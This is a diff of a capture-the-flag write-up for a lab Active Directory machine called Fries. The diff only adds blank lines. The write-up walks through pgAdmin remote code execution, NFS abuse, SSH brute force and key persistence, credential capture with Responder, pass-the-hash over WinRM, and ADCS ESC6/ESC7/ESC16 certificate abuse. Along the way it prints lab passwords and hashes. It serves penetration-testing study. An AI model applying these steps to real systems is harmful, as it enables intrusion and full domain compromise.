@@ -1,5 +1,7 @@
 Start IP-address: `10.129.244.72`
+
 Start credentials: `d.cooper@fries.htb : D4LE11maan!!`
+
 CTF - Insane difficulty 
 
 **Reconnaissance** 
@@ -52,6 +54,7 @@ ffuf -u http://fries.htb/ -H "Host: FUZZ.fries.htb" -w /home/kali/wordlists/disc
 In this subdomain exists a `gitea` service , and we can log in with start creds
 
 In app configuration (`README.md`) discovered a new subdomain ``db-mgmt05`` in which is ran a `pgAdmin 4` service database
+
 For database view  `pgAdmin 4` i must have a `root` pass , i clone this repository to look up for commits
 
 ```
@@ -77,6 +80,7 @@ I use a module in `matesploit` framework named as `multi/http/pgadmin query tool
 ![](Pasted_image_20260214193002.png)
 
 `Meterpreter` : 
+
 ![](Pasted_image_20260214193037.png)
 
 And we obtain remote code execution to linux host as `pgadmin`. After enumeration i mentioned that we are in `Docker Container` then i check an environment variables and found a password 
@@ -121,6 +125,7 @@ Shares:
 ![](Pasted_image_20260214222316.png)
 
 Checking a `NFS` shares i mentioned that there is mounted disk and probably for user `srv`
+
 Mention that root escape in True it's a serious misconfiguration and we can download all files in mounted disk. `/etc/shadow` has `root` access.
 ![](Pasted_image_20260214214720.png)
 
@@ -132,9 +137,11 @@ openssl passwd -6 GreatPassword
 
 ![](Pasted_image_20260214215736.png)
 Now replace target files in system
+
 ![](Pasted_image_20260214223909.png)
 
 It's not worked because in `/etc/exports` we doesn't have a `no root squash`
+
 ![](Pasted_image_20260214224006.png)
 
 But i have an other trick in this situation . From `/etc/passwd` file we know what users exists in target system the most interesting is `svc` and `barmen` and i tried to brute-force a credentials with existing passwords by ssh connection and we are on
@@ -146,6 +153,7 @@ svc : Friesf00Ds2025!!
 It's an initial foothold in domain but ONLY in ssh so we still need `barmen`
 
 On `NFS` share `/srv/web.fries.htb/certs` we got some certificates
+
 ![](Pasted_image_20260214225502.png]]![[Pasted_image_20260214225647.png)
 
 And there nothing so the last trick it's to use this `NFS` share so first we need to create the same user as in target system second we need to mount `NFS` share in our kali machine.
@@ -191,6 +199,7 @@ All was done in directory
 ```
 
 After shell execution we got a shell as `barmen`. We are `svc` but can do anything what `barmen` can do 
+
 ![](Pasted_image_20260215002723.png)
 
 Then i like to do `persistance` in target host. I create my own ssh key
@@ -219,12 +228,16 @@ ssh barman@fries.htb -i id rsa.barmen
 ```
 
 Advantage of this that we are fully user `barman` via ssh
+
 ![](Pasted_image_20260215005429.png)
 
 Working with `NFS` again our goal in credentials in Active Directory environment and one thing that i mentioned it is certs directory in `NFS` share 
+
 ![](Pasted_image_20260215012802.png)
 Interesting group has access named as `Infra Managers` . Previously we discover what exists in this but directory.
+
 In kali box i see that group which has access to `/certs` named as `59605603`
+
 ![](Pasted_image_20260215013139.png)
 
 So i can create this group and add myself , after copy all files
@@ -321,6 +334,7 @@ docker --tlsverify   --tlscacert=ca.pem  --tlscert=cert.pem --tlskey=certificate
 ![](Pasted_image_20260215155402.png)
 
 As we see there `https://pwm.fries.htb` 
+
 ![](Pasted_image_20260215155502.png)
 
 There are  configuration file for `LDAPS` connection if we change him to our IP-address and catch him by `responder` maybe we obtain new credentials
@@ -345,6 +359,7 @@ sudo responder -I tun0
 ```
 
 And we catch a new clear-text credentials
+
 ![](Pasted_image_20260215163753.png)
 
 ```
@@ -375,6 +390,7 @@ gMSA CA prod$ :   :cb91dc519860daf4ccd15e89e5a9d5ad
 ```
 
 Machine account `gMSA CA prod$` has `WinRM` to `DC`. Using Pass-The-Hash attack authorize by `WinRM`
+
 ![](Pasted_image_20260215173138.png)
 
 
@@ -419,6 +435,7 @@ Flag `EDITF ATTRIBUTESUBJECTALTNAME2` = 40000 , means that it is **ENABLED**
 **ESC16** prevents SID validation in the certificate, allowing identity impersonation Combined, they allow requesting a certificate for any user.
 
 After this we run again `certipy-ad` and find a `ESC7` and `ESC16`
+
 ![](Pasted_image_20260216010848.png)
 ```
 certipy-ad find -u gMSA CA prod$@fries.htb -k -no-pass -target-ip  192.168.100.1 -dc-host dc01.fries.htb -vulnerable -target dc01.fries.htb
@@ -437,9 +454,11 @@ certipy-ad ca -u gMSA CA prod$@fries.htb -k -no-pass -target-ip  192.168.100.1 -
 ```
 
 Now user `svc infra` 
+
 ![](Pasted_image_20260216015702.png)
 
 We cat try to request cert via `SubCA`
+
 ![](Pasted_image_20260216020028.png)
 
 This becomes a `ESC6` + `ESC7` certificate exploitation
@@ -468,6 +487,7 @@ Administrator :  :a773cb05d79273299a684a23ede56748
 ```
 
 ![](Pasted_image_20260216021842.png)
+
 And in `C:\Users\Administrator\Desktop` directory exists `user.txt` and `root.txt` 
 
 Thanks for reading 
